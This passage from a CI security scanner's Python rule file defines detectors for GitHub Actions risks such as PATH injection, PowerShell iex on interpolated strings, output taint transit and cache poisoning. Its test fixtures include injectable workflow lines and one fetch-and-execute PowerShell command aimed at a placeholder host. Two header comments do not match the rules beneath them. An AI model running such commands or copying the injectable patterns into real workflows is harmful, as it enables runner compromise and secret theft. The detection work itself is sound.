            "the workflow's own repository or by GitHub's runtime, "
            "so this is a quoting hygiene finding, not a command-"
            "injection finding."
        ),
        pattern=RegexPattern(
            match=(
                r"\$\{?(GITHUB_BASE_REF|GITHUB_REPOSITORY_OWNER|"
                r"GITHUB_REPOSITORY|GITHUB_WORKFLOW|GITHUB_JOB)\}?"
            ),
            exclude=[
                r"^\s*#",
                r"^\s*[\w_]+:\s*\$\{?GITHUB_",
                r"^\s*[\w_]+:\s*'[^']*\$",
                r'^\s*[\w_]+:\s*"[^"]*\$',
                r"^\s*(?:-\s*)?if:",
                r'"[^"]*\$\{?(GITHUB_BASE_REF|GITHUB_REPOSITORY_OWNER|'
                r"GITHUB_REPOSITORY|GITHUB_WORKFLOW|GITHUB_JOB)\}?[^\"]*\"",
                r"'[^']*\$\{?(GITHUB_BASE_REF|GITHUB_REPOSITORY_OWNER|"
                r"GITHUB_REPOSITORY|GITHUB_WORKFLOW|GITHUB_JOB)\}?[^']*'",
            ],
            heredoc_aware=True,
        ),
        remediation=(
            "Quote these variables in shell as a hygiene measure:\n"
            '  - pre-commit run --from-ref "origin/$GITHUB_BASE_REF" --to-ref HEAD'
        ),
        reference=(
            "https://docs.github.com/en/actions/learn-github-actions/variables"
            "#default-environment-variables"
        ),
        test_positive=[
            "      - run: pre-commit run --from-ref origin/$GITHUB_BASE_REF --to-ref HEAD",
            "      - run: echo Owner $GITHUB_REPOSITORY_OWNER",
        ],
        test_negative=[
            '      - run: echo "$GITHUB_BASE_REF"',
            # Out of scope: attacker-controlled vars handled by SEC4-GH-018.
            "      - run: echo $GITHUB_HEAD_REF",
            "      - run: echo $GITHUB_REF_NAME",
        ],
        stride=["T"],
        threat_narrative=(
            "Maintainer-controlled GitHub env vars don't carry an "
            "attacker-injection primitive, but unquoted references "
            "still break on values containing whitespace or shell-"
            "active characters. Quoting hygiene is the fix; severity "
            "kept at MEDIUM with low confidence to reflect the lint-"
            "only nature of the finding."
        ),
        incidents=[],
    ),
    # =========================================================================
    # CICD-SEC-4 continued — PowerShell Invoke-Expression on interpolated
    # string (closes FINDINGS §F-4)
    # =========================================================================
    Rule(
        id="SEC4-GH-017",
        title="PowerShell Invoke-Expression on an interpolated string",
        severity=Severity.HIGH,
        platform=Platform.GITHUB,
        owasp_cicd="CICD-SEC-4",
        description=(
            'PowerShell `iex "$(...)"` / `iex "$var"` / `Invoke-Expression "..."` '
            "re-parses its argument AS POWERSHELL SOURCE. The enclosing "
            "double quotes tell PowerShell to INTERPOLATE the subexpression "
            "or variable before iex runs — by the time iex sees the string, "
            "the interpolated value is spliced in and will be parsed as "
            "code. Any attacker-influenced value becomes PowerShell source. "
            'Structurally identical to shell `eval "$VAR"` (SEC4-GL-006). '
            "Distinct from SEC6-GH-007's iex branch, which catches iex on "
            "REMOTE-FETCH payloads (DownloadString, WebClient, etc.); this "
            "rule catches iex on LOCAL interpolation surfaces that don't "
            "necessarily involve network fetch."
        ),
        pattern=RegexPattern(
            # iex / Invoke-Expression followed by a double-quoted string
            # whose body contains either `$(` (subexpression) or `$<letter>`
            # (bare variable). Single-quoted ('...') bodies in PowerShell
            # don't interpolate and are intentionally NOT matched.
            match=(
                r"\b(iex|Invoke-Expression)\b\s+"
                r"\"[^\"]*\$(?:\(|[A-Za-z_])"
            ),
            exclude=[r"^\s*#"],
            heredoc_aware=True,
            # SINK calibration: ``iex`` is a PowerShell shell-execution sink
            # only inside a ``run:`` shell.  An ``iex`` string sitting inside an
            # action's ``with:`` input body (e.g. the markdown ``message:`` of
            # ``mshick/add-pr-comment`` — install instructions posted as a PR
            # comment, never executed by the runner) is data, not a sink.  Mask
            # ``with:``/``env:`` block bodies so the rule fires only on real
            # runner shell.  Field-precision FP S041 (Azure/bicep build.yml).
            github_with_env_block_aware=True,
        ),
        remediation=(
            "Don't use iex on interpolated strings. If you need to execute a "
            "command whose name is data, use `&` (call operator) with a "
            "validated command-string variable:\n"
            "  $cmd = Get-AllowedCommand $Input  # validated against a whitelist\n"
            "  & $cmd arg1 arg2\n"
            "Never iex a double-quoted string containing attacker-influenced "
            "variables."
        ),
        reference="https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-expression",
        test_positive=[
            "      - run: pwsh -c 'iex \"$($MyVariable)\"'",
            "      - run: pwsh -c 'iex \"$env:USER_INPUT\"'",
            "      - run: pwsh -c 'Invoke-Expression \"$($Data)\"'",
        ],
        test_negative=[
            "      - run: pwsh -c 'iex (Get-Content ./local.ps1)'",
            "      - run: pwsh -c 'iex \"literal command\"'",
            "      # - run: pwsh -c 'iex \"$($X)\"'  (commented out)",
            # FP S041: an ``iex`` string that lives inside an action's ``with:``
            # input body (here a markdown ``message:`` posted as a PR comment by
            # mshick/add-pr-comment) is install-instruction DATA, never executed
            # by the runner — not a PowerShell shell sink.
            "      - uses: mshick/add-pr-comment@v3\n"
            "        with:\n"
            "          message: |\n"
            '            iex "& { $(irm https://example/x.ps1) } -RunId 1"\n',
        ],
        stride=["T", "E"],
        threat_narrative=(
            "PowerShell's double-quoted strings interpolate their body before "
            "the string is used. When iex receives such a string, the "
            "interpolated value is splice-in code that iex then parses and "
            "runs. An attacker who can set or influence the interpolated "
            "variable owns execution with the runner's secrets and token."
        ),
        incidents=[],
    ),
    # =========================================================================
    # SEC4-GH-019: GITHUB_PATH injection — CRITICAL
    # =========================================================================
    Rule(
        id="SEC4-GH-019",
        title="Attacker-controlled value written to GITHUB_PATH",
        severity=Severity.CRITICAL,
        platform=Platform.GITHUB,
        owasp_cicd="CICD-SEC-4",
        description=(
            "Attacker-controlled GitHub context value (PR title, issue body, head_ref, etc.) "
            "is written directly to $GITHUB_PATH. This prepends a PATH entry for ALL "
            "subsequent steps — more severe than GITHUB_ENV injection because every "
            "unqualified command lookup (including `git`, `node`, `python`, tool shims "
            "baked into later actions) traverses the injected entry first. "
            "If the attacker can place an executable there, they hijack arbitrary commands "
            "in later steps with no explicit reference needed. "
            "Direct twin of SEC4-GH-006 against a broader attack surface."
        ),
        pattern=RegexPattern(
            match=(
                # Span bounded ({0,512}) so an adversarial ${{-heavy blob
                # can't drive quadratic backtracking. Real Actions
                # expressions are far shorter, so this is behavior-
                # preserving on true positives. See test_redos_bounds.py.
                r"\$\{\{[^}]{0,512}"
                r"(event\.(issue\.(title|body)|pull_request\.(title|body)|comment\.body"
                r"|head_commit\.message|review\.body)|head_ref)"
                r"[^}]{0,512}\}\}[^#\n]*>>\s*\$GITHUB_PATH"
            ),
            exclude=[r"^\s*#"],
        ),
        remediation=(
            "Never write attacker-controlled values to $GITHUB_PATH — every\n"
            "unqualified command lookup in later steps traverses the injected\n"
            "entry first.  Prefer a hardcoded path; if a dynamic value is\n"
            "unavoidable, allowlist at the write site with a Bash `case`:\n"
            "  env:\n    SAFE_DIR: ${{ github.event.pull_request.head.repo.owner.login }}\n"
            '  run: case "$SAFE_DIR" in trusted-org) echo "/opt/$SAFE_DIR/bin" >> $GITHUB_PATH ;; *) exit 1 ;; esac\n'
            "Run `taintly --guide SEC4-GH-019` for the full checklist."
        ),
        reference="https://securitylab.github.com/resources/github-actions-untrusted-input/",
        test_positive=[
            '        run: echo "${{ github.event.pull_request.title }}" >> $GITHUB_PATH',
            '        run: echo "${{ github.head_ref }}" >> $GITHUB_PATH',
            '        run: echo "/tmp/${{ github.event.issue.body }}/bin" >> $GITHUB_PATH',
        ],
        test_negative=[
            '        run: echo "/opt/custom/bin" >> $GITHUB_PATH',
            '        run: echo "$SAFE_DIR" >> $GITHUB_PATH',
            '        # run: echo "${{ github.event.pull_request.title }}" >> $GITHUB_PATH',
        ],
        stride=["E", "T"],
        threat_narrative=(
            "Writing attacker-controlled values to $GITHUB_PATH prepends a directory to the "
            "search path for every subsequent step in the job. Unlike $GITHUB_ENV injection, "
            "which only affects steps that reference the injected variable, PATH injection "
            "hijacks any unqualified command lookup — an attacker need not know which specific "
            "commands later steps will run. A single write that places the attacker's directory "
            "before /usr/bin owns execution of every later tool invocation in the job."
        ),
        incidents=[],
    ),
    # =========================================================================
    # SEC4-GH-021: ``github.actor`` (or bot-login) used as a trust gate
    # =========================================================================
    # Workflows commonly gate privileged operations on
    # ``github.actor == 'dependabot[bot]'`` or similar, under the
    # assumption that the actor field is a safe bot identity.  In
    # several trigger paths this assumption is wrong:
    #
    #   * ``workflow_run`` triggered by a forked PR's workflow runs
    #     under the *fork author*, but ``github.actor`` reflects the
    #     triggering workflow's actor — easy to confuse.
    #   * ``pull_request`` from a fork can spoof a bot login by
    #     committing as ``Dependabot <noreply@...>`` (the actor still
    #     reads as the PR author, but downstream hash-checking is
    #     surprising).
    #   * Bot logins shadowed by a user with that exact display name
    #     can route around the gate on legacy events.
    #
    # The rule is a sibling of SEC4-GH-010 (actor in log message);
    # there the actor is observed but not trusted, here it IS trusted.
    # Industry peer audits (e.g. zizmor's ``bot-conditions``) cover
    # the same threat class.
    Rule(
        id="SEC4-GH-021",
        title="Step output interpolated into shell — taint transit via outputs",
        severity=Severity.MEDIUM,
        platform=Platform.GITHUB,
        owasp_cicd="CICD-SEC-4",
        review_needed=True,
        confidence="low",
        description=(
            "A ``${{ steps.<id>.outputs.<name> }}`` reference is "
            "spliced into a workflow expression outside of a safe "
            "``env:`` assignment.  Step outputs are common transit "
            "for attacker-controllable bytes: a previous step that "
            "scrapes a PR title via ``gh api``, reads a file the PR "
            "author wrote, or captures any ``github.event.*`` value "
            "into ``$GITHUB_OUTPUT`` produces an output that carries "
            "attacker bytes.  Splicing that output into a ``run:`` "
            "body is shell injection — the same threat shape as "
            "``${{ github.event.X }}`` direct interpolation, but the "
            "taint transits through the step-output map.  Review the "
            "upstream step that produces the output; if any upstream "
            "value can come from a fork PR / issue / comment / "
            "branch name, route through ``env:`` and validate."
        ),
        pattern=StepOutputShellInterpolationPattern(),
        remediation=(
            "Route the step output through an ``env:`` mapping at the "
            "consuming step, then reference as a double-quoted shell "
            "variable.  Validate against an allowlist if the upstream "
            "value can come from a fork PR:\n"
            "  env:\n    TITLE: ${{ steps.read-pr.outputs.title }}\n"
            '  run: case "$TITLE" in [A-Za-z0-9\\ -]*) ;; *) exit 1;; esac\n'
            "If the upstream step is itself sanitising attacker input "
            "(``jq -R`` shell-escape, allowlist regex), document that "
            "in a comment on the producing step so future readers see "
            "the chain.  This rule is review-needed because the "
            "taint source is not visible from the consuming line "
            "alone — it depends on the upstream producer."
        ),
        reference="https://docs.github.com/en/actions/security-for-github-actions/security-guides/security-hardening-for-github-actions#using-an-intermediate-environment-variable",
        test_positive=[
            '        run: echo "${{ steps.pr.outputs.title }}"',
            "        run: gh release create v1 ${{ steps.tag.outputs.name }}",
        ],
        test_negative=[
            # Whole-value safe assignment.
            "        env:\n          TITLE: ${{ steps.pr.outputs.title }}",
            # Comment.
            '        # run: echo "${{ steps.pr.outputs.title }}"',
            # if-guard.
            "        if: steps.check.outputs.status == 'ok'",
            # Metadata key — ``name:`` of a step is display.
            "      - name: Build ${{ steps.cfg.outputs.label }}",
        ],
        stride=["T", "E"],
        threat_narrative=(
            "Step outputs are an opaque transit channel for attacker-"
            "controllable bytes.  A workflow author who carefully avoids "
            "``${{ github.event.X }}`` directly in a ``run:`` body can "
            "still be compromised when an earlier step reads the same "
            "value into an output and the later step splices it in.  "
            "The Langflow and Ultralytics injections (2024-2025) both "
            "had upstream-output forms in the wild — SEC4-GH-004 "
            "catches the direct form; this rule catches the transit "
            "form."
        ),
    ),
    # =========================================================================
    # SEC4-GH-022: ``base64 -d | shell`` obfuscation in run-block
    # =========================================================================
    # A ``run:`` block decodes a base64-encoded string and pipes
    # the decoded bytes directly into a shell or
    # interpreter.  Encoded payloads are the canonical fingerprint of
    # supply-chain attack code: diff reviewers and string-pattern
    # scanners can't match the literal commands.  Industry peer audits
    # (e.g. zizmor's ``obfuscation``) cover the same threat class.
    Rule(
        id="SEC4-GH-022",
        title="Cross-job output interpolated into shell — taint transit via needs",
        severity=Severity.MEDIUM,
        platform=Platform.GITHUB,
        owasp_cicd="CICD-SEC-4",
        review_needed=True,
        confidence="low",
        description=(
            "A ``${{ needs.<job>.outputs.<name> }}`` reference is "
            "spliced into a shell ``run:`` body.  Job-level "
            "``outputs:`` are common transit for attacker-"
            "controllable bytes: a step in the upstream job that "
            "scrapes a PR title via ``gh api``, reads a file the "
            "PR author wrote, or captures any ``github.event.*`` "
            "value into ``$GITHUB_OUTPUT`` produces a job output "
            "that carries attacker bytes.  Splicing that output "
            "into a consumer job's ``run:`` body is shell "
            "injection — the same threat shape as ``${{ "
            "github.event.X }}`` direct interpolation, but the "
            "taint transits through the needs-graph rather than "
            "a same-job step output (see SEC4-GH-021 for the "
            "same-job form).  Review the upstream job's "
            "outputs-producing step; if any value can come from "
            "a fork PR / issue / comment / branch name, route "
            "through ``env:`` and validate."
        ),
        pattern=NeedsOutputShellInterpolationPattern(),
        remediation=(
            "Route the needs-output through an ``env:`` mapping at "
            "the consuming step, then reference as a double-quoted "
            "shell variable:\n"
            "  env:\n    VERSION: ${{ needs.upstream.outputs.version }}\n"
            '  run: deploy.sh "$VERSION"\n'
            "If the upstream value can come from a fork PR / "
            "issue body / comment, validate against an allowlist "
            "at the consumer (parameter-expansion strip):\n"
            "  env:\n    REF: ${{ needs.upstream.outputs.ref }}\n"
            '  run: git checkout "${REF//[^a-zA-Z0-9._/-]/}"\n'
            "This rule is review-needed because the taint source "
            "is not visible from the consuming line alone — it "
            "depends on the upstream job's outputs-producing step."
        ),
        reference="https://docs.github.com/en/actions/security-for-github-actions/security-guides/security-hardening-for-github-actions#using-an-intermediate-environment-variable",
        test_positive=[
            "        run: deploy.sh ${{ needs.upstream.outputs.version }}",
            "        run: gh release create ${{ needs.build.outputs.tag }}",
        ],
        test_negative=[
            # Whole-value safe assignment.
            "        env:\n          VERSION: ${{ needs.upstream.outputs.version }}",
            # Comment.
            "        # run: deploy.sh ${{ needs.upstream.outputs.version }}",
            # if-guard.
            "        if: needs.upstream.outputs.ready == 'true'",
            # Metadata key — display.
            "      - name: build ${{ needs.upstream.outputs.label }}",
            # Sibling rule's territory: steps.X.outputs.Y is SEC4-GH-021,
            # SEC4-GH-022 must not double-fire on it.
            "        run: deploy.sh ${{ steps.compute.outputs.version }}",
        ],
        stride=["T", "E"],
        threat_narrative=(
            "Cross-job outputs are an opaque taint-transit channel "
            "across the needs-graph.  A workflow author who "
            "carefully avoids ``${{ github.event.X }}`` directly "
            "in a consumer's ``run:`` body can still be compromised "
            "when the upstream job in needs: captures the same "
            "attacker bytes into its outputs.  The transit form "
            "evades direct-context scanners while preserving the "
            "injection risk at the consuming step.  SEC4-GH-004 "
            "catches the direct form, SEC4-GH-021 catches the "
            "same-job step-output transit, and this rule catches "
            "the cross-job needs-output transit."
        ),
        incidents=["Ultralytics (Dec 2024, cross-job analog)"],
    ),
    # =========================================================================
    # SEC4-GH-023: ``${{ steps.X.outputs.Y }}`` interpolated into shell
    #
    # Step outputs are common transit for attacker-controllable bytes:
    # an earlier step that scrapes a PR title via ``gh api``, reads a
    # file the PR author wrote, or captures any ``github.event.*``
    # value into ``$GITHUB_OUTPUT`` produces an output that carries
    # attacker bytes.  Splicing that output into a ``run:`` body is
    # shell injection — same threat shape as ``github.event.X`` direct
    # splice (SEC4-GH-004), but the taint transits through the
    # step-output map.  Maps to part of zizmor's
    # ``template-injection`` audit.
    # =========================================================================
    # =========================================================================
    # SEC4-GH-026: cache poisoning surface — fork-reachable trigger writes
    # to a workflow cache that subsequent privileged runs read from.
    # =========================================================================
    # GitHub Actions' cache (``actions/cache`` and ``setup-*`` actions
    # with ``cache:`` enabled) is partitioned by repository + branch
    # ref + cache key.  A pull_request workflow that WRITES the cache
    # creates an entry attacker-controlled in content, keyed on a value
    # that a later push/release workflow may LOOK UP (cache-restore
    # falls back across branches via ``restore-keys:``).  When that
    # later workflow is privileged (write token, OIDC mint, deploy
    # job), the poisoned cache becomes a PPE chain: PR diff modifies
    # build output -> cache write captures it -> main-branch build
    # restores it -> privileged step executes poisoned artifact.
    #
    # Single-file shape - gap surfaced by the 2026-05-17 comparison
    # study; zizmor's ``cache-poisoning`` catches this on the same
    # workflow; taintly's CHAIN-GH-001 requires cross-workflow
    # evidence and misses the same-file form.
    #
    # Trigger tier split (2026-05-19): pull_request and pull_request_target
    # have different blast radii.  This rule keeps the plain pull_request
    # posture signal at INFO + review_needed; SEC4-GH-026A handles the
    # higher-risk pull_request_target form at MEDIUM.
    Rule(
        id="SEC4-GH-026",
        title="Cache write under pull_request trigger - cache-poisoning surface",
        severity=Severity.INFO,
        platform=Platform.GITHUB,
        owasp_cicd="CICD-SEC-4",
        description=(
            "A workflow whose ``on:`` block includes a ``pull_request`` "
            "trigger (NOT ``pull_request_target`` — see SEC4-GH-026A "
            "for that) writes to the GitHub Actions cache - either "
            "via ``uses: actions/cache@`` (the direct form) or via a "
            "``setup-*`` action with ``cache:`` enabled (the implicit "
            "form, where ``setup-node``/``setup-python``/``setup-go``/"
            "``setup-java`` store dependency caches keyed by lockfile "
            "hash).\n"
            "\n"
            "Under ``pull_request``, the workflow runs with a default-"
            "read-only ``GITHUB_TOKEN`` (since Feb-2023 for newly-"
            "created orgs).  The cache write surface exists, but the "
            "actual exploitation path requires a later privileged "
            "workflow to restore under the same key prefix — that "
            "cross-trigger shape is XF-GH-001 / XF-GH-001A's domain.  "
            "This rule fires as a posture signal so the cache write "
            "is visible during review, not as a confirmed exploit.\n"
            "\n"
            "INFO + ``review_needed``: many cache keys are PR-number-"
            "scoped (``${{ github.run_id }}`` / ``${{ github.event."
            "number }}``) and never matched by main-branch restores, "
            "so the threat model only applies when the cache key "
            "shape allows cross-branch restoration.  Operators who "
            "want LOW enforcement can override via ``.taintly.yml``."
        ),
        pattern=ContextPattern(
            # Anchor on the cache write - both direct (actions/cache /
            # actions/cache/save) and the implicit setup-* form
            # (cache: <package-manager>).
            anchor=(
                r"(?:"
                r"uses:\s+actions/cache(?:/save)?@"
                r"|cache:\s*(?:true|npm|yarn|pip|pipenv|poetry|gradle|maven|sbt|go|cargo)"
                r")"
            ),
            # Workflow must declare ``pull_request`` (and NOT
            # ``pull_request_target`` or a ``github.event.pull_request.*``
            # context reference).  The lookahead chain
            # ``(?!_target|\.)`` excludes both the superstring
            # ``pull_request_target`` (SEC4-GH-026A's territory) and
            # the github-context references like
            # ``${{ github.event.pull_request.head.sha }}`` which
            # technically contain ``pull_request`` as a substring but
            # are NOT the trigger declaration.  Surfaced by the
            # TanStack kill-chain fixture (tanstack-kill-chain-fixture-v1):
            # ``pull_request_target`` workflows that also reference
            # ``github.event.pull_request.head`` would otherwise
            # co-fire 026 and 026A on the same line.  Tolerant of
            # block form (``on:\n  pull_request:``) and inline
            # list/flow forms.
            requires=r"(?ms)^on:\s*(?:\n\s+|\[?\s*).*?pull_request(?!_target|\.)\b",
            exclude=[r"^\s*#"],
        ),
        remediation=(
            "Pick one:\n"
            "  1. Scope the cache key to a value that NEVER matches a "
            "later non-PR run:\n"
            "     - ``key: ${{ github.event.number }}-${{ hashFiles('lockfile') }}``\n"
            "     - Avoid bare ``hashFiles('package-lock.json')`` keys "
            "without a PR-bound prefix.\n"
            "  2. Drop ``restore-keys:`` entirely - no fallback means "
            "no cross-branch lookup.\n"
            "  3. Move the cache write to a non-PR-triggered workflow "
            "(``push`` on protected branches only).\n"
            "  4. If the cache content is build output rather than "
            "dependency lock material, verify the build output is "
            "deterministic and re-derived from pinned inputs each run."
        ),
        reference=(
            "https://docs.github.com/en/actions/using-workflows/"
            "caching-dependencies-to-speed-up-workflows"
        ),
        test_positive=[
            (
                "on:\n  pull_request:\n    branches: [main]\njobs:\n"
                "  build:\n    runs-on: ubuntu-latest\n    steps:\n"
                "      - uses: actions/cache@v4\n        with:\n"
                "          path: ./node_modules\n"
                "          key: ${{ hashFiles('package-lock.json') }}\n"
            ),
            (
                "on:\n  pull_request: {}\njobs:\n  test:\n"
                "    runs-on: ubuntu-latest\n    steps:\n"
                "      - uses: actions/setup-node@v4\n        with:\n"
                "          node-version: 20\n          cache: npm\n"
            ),
        ],
        test_negative=[
            # No fork-reachable trigger.
            (
                "on:\n  push:\n    branches: [main]\njobs:\n  build:\n"
                "    runs-on: ubuntu-latest\n    steps:\n"
                "      - uses: actions/cache@v4\n        with:\n"
                "          path: ./out\n"
                "          key: ${{ hashFiles('lockfile') }}\n"
            ),
            # Cache-restore-only - we anchor on the save / unified
            # cache, not restore-only.
            (
                "on:\n  pull_request: {}\njobs:\n  test:\n"
                "    runs-on: ubuntu-latest\n    steps:\n"
                "      - uses: actions/cache/restore@v4\n        with:\n"
                "          key: ${{ hashFiles('lockfile') }}\n"
            ),
            # pull_request_target is SEC4-GH-026A's territory.  The
            # negative lookahead on ``pull_request(?!_target)`` keeps
            # this rule silent on the higher-risk trigger.
            (
                "on:\n  pull_request_target: {}\njobs:\n  test:\n"
                "    runs-on: ubuntu-latest\n    steps:\n"
                "      - uses: actions/cache@v4\n        with:\n"
                "          path: ./node_modules\n"
                "          key: ${{ hashFiles('package-lock.json') }}\n"
            ),
            # Comment-only mention.
            "      # uses: actions/cache@v4",
        ],
        stride=["T", "E"],
        threat_narrative=(
            "A pull request modifies a built artifact - a webpack "
            "bundle, a compiled binary, a generated config - in a way "
            "the lockfile hash doesn't reflect.  The PR-triggered "
            "workflow's cache write captures the modified output under "
            "a key derived from the lockfile hash.  Later, a release "
            "or deploy workflow on main looks up the same key, falls "
            "back via ``restore-keys:`` to the PR's entry, and runs "
            "the attacker-shaped bytes with the privileged workflow's "
            "token.  The lockfile never changed, the PR was never "
            "merged, but the cache became a transit channel for the "
            "attacker's payload."
        ),
        review_needed=True,
    ),
    # =========================================================================
    # SEC4-GH-026A: cache poisoning surface under pull_request_target.
    # =========================================================================
    Rule(
        id="SEC4-GH-026A",
        title="Cache write under pull_request_target - cache-poisoning attack surface",
        severity=Severity.MEDIUM,
        platform=Platform.GITHUB,
        owasp_cicd="CICD-SEC-4",
        description=(
            "A workflow whose ``on:`` block includes a "
            "``pull_request_target`` trigger writes to the GitHub "
            "Actions cache - either via ``uses: actions/cache@`` "
            "(the direct form) or via a ``setup-*`` action with "
            "``cache:`` enabled (the implicit form, where "
            "``setup-node`` / ``setup-python`` / ``setup-go`` / "
            "``setup-java`` store dependency caches keyed by "
            "lockfile hash).\n"
            "\n"
            "Unlike plain ``pull_request``, ``pull_request_target`` "
            "checks out the fork's HEAD but executes with the PARENT "
            "repo's ``GITHUB_TOKEN`` and any explicit ``permissions:`` "
            "grants — typically including write scopes.  The cache "
            "write is a primary attack surface: attacker-controlled "
            "bytes from the fork are persisted into a cache entry "
            "indexed by a key the maintainers' downstream workflows "
            "may later restore from.  Combined with explicit ``write`` "
            "permissions, the surface is exploitation-ready, not "
            "posture noise.\n"
            "\n"
            "Restore-only forms (``actions/cache/restore``) are not "
            "anchored - they read but do not write the poisoned "
            "entry; the actual exploitation is the WRITE, not the "
            "read.  Cross-workflow restoration of a previously-"
            "poisoned cache is XF-GH-001 / XF-GH-001A's domain."
        ),
        pattern=ContextPattern(
            # Same anchor as SEC4-GH-026 — cache write only.
            anchor=(
                r"(?:"
                r"uses:\s+actions/cache(?:/save)?@"
                r"|cache:\s*(?:true|npm|yarn|pip|pipenv|poetry|gradle|maven|sbt|go|cargo)"
                r")"
            ),
            # Workflow must declare ``pull_request_target`` (the
            # ``_target`` suffix is required — plain ``pull_request``
            # is SEC4-GH-026's territory at INFO).
            requires=r"(?ms)^on:\s*(?:\n\s+|\[?\s*).*?pull_request_target\b",
            exclude=[r"^\s*#"],
        ),
        remediation=(
            "Pick one:\n"
            "  1. Move the cache write to a separate ``push``-only "
            "workflow on protected branches.  ``pull_request_target`` "
            "should run only the minimal, read-only steps required "
            "for the trusted post-merge logic.\n"
            "  2. If the cache write must remain in the PRT workflow, "
            "drop ``permissions:`` to ``contents: read`` (or finer) "
            "and verify the cache content is deterministic from "
            "non-attacker-controlled inputs.\n"
            "  3. Switch to ``actions/cache/restore@`` (read-only) "
            "and let a separate post-merge workflow do the save.\n"
            "  4. Scope the cache key to a value that NEVER matches "
            "a later non-PRT run (e.g. include "
            "``${{ github.event.number }}`` as a key prefix)."
        ),
        reference=(
            "https://docs.github.com/en/actions/security-for-github-actions/"
            "security-guides/security-hardening-for-github-actions"
            "#using-the-pull_request_target-event"
        ),
        test_positive=[
            (
                "on:\n  pull_request_target:\n    branches: [main]\n"
                "permissions:\n  contents: write\n"
                "jobs:\n  build:\n    runs-on: ubuntu-latest\n"
                "    steps:\n      - uses: actions/cache@v4\n"
                "        with:\n          path: ./node_modules\n"
                "          key: ${{ hashFiles('package-lock.json') }}\n"
            ),
            (
                "on:\n  pull_request_target: {}\njobs:\n  test:\n"
                "    runs-on: ubuntu-latest\n    steps:\n"
                "      - uses: actions/setup-node@v4\n        with:\n"
                "          node-version: 20\n          cache: npm\n"
            ),
        ],
        test_negative=[
            # pull_request (no _target) is SEC4-GH-026's territory.
            (
                "on:\n  pull_request:\n    branches: [main]\n"
                "jobs:\n  build:\n    runs-on: ubuntu-latest\n"
                "    steps:\n      - uses: actions/cache@v4\n"
                "        with:\n          path: ./node_modules\n"
                "          key: ${{ hashFiles('package-lock.json') }}\n"
            ),
            # Push-only trigger.
            (
                "on:\n  push:\n    branches: [main]\njobs:\n  build:\n"
                "    runs-on: ubuntu-latest\n    steps:\n"
                "      - uses: actions/cache@v4\n        with:\n"
                "          key: ${{ hashFiles('lockfile') }}\n"
            ),
            # Restore-only under pull_request_target.
            (
                "on:\n  pull_request_target: {}\njobs:\n  test:\n"
                "    runs-on: ubuntu-latest\n    steps:\n"
                "      - uses: actions/cache/restore@v4\n        with:\n"
                "          key: ${{ hashFiles('lockfile') }}\n"
            ),
        ],
        stride=["T", "E", "I"],
        threat_narrative=(
            "A maintainer enables ``pull_request_target`` so the CI "
            "build can post comments / labels / status checks on "
            "external PRs.  The build also caches ``node_modules`` "
            "or pip wheels keyed on ``hashFiles('package-lock.json')``.  "
            "An attacker opens a PR that modifies ``package-lock.json`` "
            "to point at a malicious tarball; the CI build runs "
            "(with parent-repo permissions), the cache write captures "
            "the malicious dependency layer indexed by the new lockfile "
            "hash.  A maintainer's later release workflow on ``push`` "
            "computes the same hash, restores the poisoned cache, and "
            "publishes the malicious build artefacts under the "
            "maintainer's signing identity."
        ),
    ),
    Rule(
        id="SEC4-GH-011A",
        finding_family="pipeline_tool_execution",
        title="Package install in pull_request_target uses --ignore-scripts but still resolves PR dependencies",
        severity=Severity.HIGH,
        platform=Platform.GITHUB,
        owasp_cicd="CICD-SEC-4",
        description=(
            "Workflow uses pull_request_target and runs a JavaScript package-manager install "
            "with --ignore-scripts. The flag disables npm/yarn/pnpm lifecycle-hook execution, "
            "but the job still resolves attacker-controlled dependency metadata from the PR "
            "branch in a privileged context."
        ),
        pattern=ContextPattern(
            anchor=_IGNORE_SCRIPTS_INSTALL_LINE_RE,
            requires=_PRT_TRIGGER_RE,
            exclude=[r"^\s*#"],
            anchor_job_exclude=(
                r"if:.*github\.event_name\s*==\s*['\"]"
                r"(?:push|schedule|workflow_dispatch|workflow_call|merge_group"
                r"|release|deployment|pull_request)['\"]"
                r"|if:.*github\.event_name\s*!=\s*['\"]pull_request_target['\"]"
            ),
        ),
        remediation=(
            "`--ignore-scripts` reduces lifecycle-hook RCE risk, but do not run package "
            "installation against PR-controlled manifests in `pull_request_target`. Use a "
            "non-privileged `pull_request` workflow for install/build/test, then hand only "
            "reviewed artifacts to privileged follow-up jobs."
        ),
        reference="https://securitylab.github.com/resources/github-actions-preventing-pwn-requests/",
        test_positive=[
            "on:\n  pull_request_target:\njobs:\n  test:\n    steps:\n      - run: npm install --ignore-scripts",
            "on:\n  pull_request_target:\njobs:\n  test:\n    steps:\n      - run: pnpm i --ignore-scripts --frozen-lockfile",
            "on:\n  pull_request_target:\njobs:\n  test:\n    steps:\n      - run: yarn install --ignore-scripts",
        ],
        test_negative=[
            "on:\n  pull_request:\njobs:\n  test:\n    steps:\n      - run: npm install --ignore-scripts",
            "on:\n  pull_request_target:\njobs:\n  test:\n    steps:\n      - run: npm install && npm test",
            "on:\n  pull_request_target:\njobs:\n  test:\n    steps:\n      - run: npm install --ignore-scripts && npm test",
        ],
        stride=["E", "T"],
        threat_narrative=(
            "The `--ignore-scripts` flag removes the highest-confidence lifecycle-hook RCE "
            "path, but dependency resolution still consumes attacker-controlled package "
            "metadata in a privileged `pull_request_target` run. Treat this as a reduced but "
            "still meaningful poisoned-pipeline surface."
        ),
    ),
    Rule(
        id="SEC4-GH-012A",
        title="Local reusable workflow receives all caller secrets",
        severity=Severity.MEDIUM,
        platform=Platform.GITHUB,
        owasp_cicd="CICD-SEC-4",
        description=(
            "secrets: inherit passes all caller secrets to a same-repository reusable workflow. "
            "The caller and callee are controlled together, so this is lower risk than a "
            "cross-repository callee, but it still broadens the blast radius of any compromised "
            "action or command inside the local reusable workflow."
        ),
        pattern=ReusableWorkflowSecretsInheritPattern(local=True),
        remediation=(
            "Prefer listing only the secrets the local reusable workflow needs:\n"
            "  secrets:\n    DEPLOY_KEY: ${{ secrets.DEPLOY_KEY }}\n"
            "Reserve `secrets: inherit` for small, audited local callees where the broad "
            "secret boundary is intentional."
        ),
        reference="https://docs.github.com/en/actions/sharing-automations/reusing-workflows#passing-inputs-and-secrets-to-a-reusable-workflow",
        test_positive=[
            "jobs:\n  call:\n    uses: ./.github/workflows/reusable.yml\n    secrets: inherit",
            "jobs:\n  call:\n    uses: './.github/workflows/reusable.yml'\n    secrets: inherit",
            "jobs:\n  call:\n    uses: ./.github/workflows/reusable.yml\n    secrets:\n      inherit",
        ],
        test_negative=[
